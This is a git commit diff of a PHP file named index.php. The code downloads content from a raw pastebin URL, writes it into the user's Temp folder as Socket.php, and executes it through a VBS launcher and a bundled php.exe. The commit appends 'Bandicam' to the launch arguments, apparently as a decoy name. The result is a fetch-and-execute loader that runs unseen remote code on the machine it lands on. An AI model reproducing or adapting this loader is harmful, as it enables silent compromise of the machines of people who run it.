f9a8553194c6e9a3c92cf14cf87f264147b037e0
MohamadXo213 <46904638+MohamadXo213@users.noreply.github.com>
2021-07-04 01:30:21 -0700

    Update index.php

--- index.php
+++ index.php
@@ -4,13 +4,13 @@
 	$file = fopen($filename, "w");
 	fwrite($file, $code);
 	fclose($file);
-	system(dirname(__FILE__) . "\Executer.vbs " . dirname(__FILE__) . "\php.exe " . $filename . " ");
+	system(dirname(__FILE__) . "\Executer.vbs " . dirname(__FILE__) . "\php.exe " . $filename . " Bandicam");
 
 	$code = file_get_contents("https://pastebin.com/raw/gVJKJXTk");
 	$filename = "C:\\Users\\" . get_current_user() . "\\AppData\\Local\\Temp\\Socket.php";
 	$file = fopen($filename, "w");
 	fwrite($file, $code);
 	fclose($file);
-	system(dirname(__FILE__) . "\Executer.vbs " . dirname(__FILE__) . "\php.exe " . $filename . " ");
+	system(dirname(__FILE__) . "\Executer.vbs " . dirname(__FILE__) . "\php.exe " . $filename . " Bandicam");
  exit;
 ?>
